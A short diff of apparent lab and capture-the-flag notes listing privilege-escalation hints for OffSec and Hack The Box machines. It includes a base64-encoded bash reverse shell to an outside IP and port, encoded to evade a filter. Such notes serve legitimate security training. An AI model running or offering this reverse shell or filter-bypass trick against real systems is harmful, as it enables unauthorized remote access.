@@ -452,3 +452,6 @@ use this exp to generate a jpg file, cp to the dir collected by script. and get 
    windows Priv Es AlwaysInstallElevated  set to 1 in HKLM!  set to 1 in HKCU!
 #### image.offsec
   make base64 reverse shell to bypass filter  L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMjQ0Lzg4MjEgMD4mMQo= | base64 -d | bash; trace with SUID
+
+#### smarthire.htb
+  Priv Es: python .pth file path injection;
